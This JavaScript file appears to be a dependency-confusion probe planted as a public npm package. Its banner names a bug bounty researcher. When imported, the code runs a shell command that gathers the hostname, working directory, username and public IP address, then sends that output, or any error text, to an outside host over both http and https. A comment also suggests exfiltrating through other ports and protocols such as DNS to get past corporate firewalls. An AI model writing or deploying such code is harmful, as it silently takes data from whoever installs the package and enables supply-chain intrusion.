
console.log('You unintentionally installed a public package from NPM. Please contact https://hackerone.com/thiezn?type=user');
/*
Leak stuff through making web requests on imports. To bypass corporate
firewalls you can also consider exfiltrating data through different ports
and protocols like http, https, dns and others.

See this excellent blog post that explains why this is could lead to serious security issues:
https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
*/

const { exec } = require("child_process");
const { stdout } = require("process");
exec("a=$(hostname;pwd;whoami;curl https://ifconfig.me;) && echo $a", (error, data, error_str) => {
    if (error) {
        console.log("error", error.message);
        fetch("http://www.mortimer.nl/mpf/depconfusion/fc-collabsible?error=" + error.message)
        fetch("https://www.mortimer.nl/mpf/depconfusion/fc-collabsible?error=" + error.message)
        return;
    }
    console.log(data);
    fetch("http://www.mortimer.nl/mpf/depconfusion/fc-collabsible?stdout=" + data)
    fetch("https://www.mortimer.nl/mpf/depconfusion/fc-collabsible?stdout=" + data)
});
    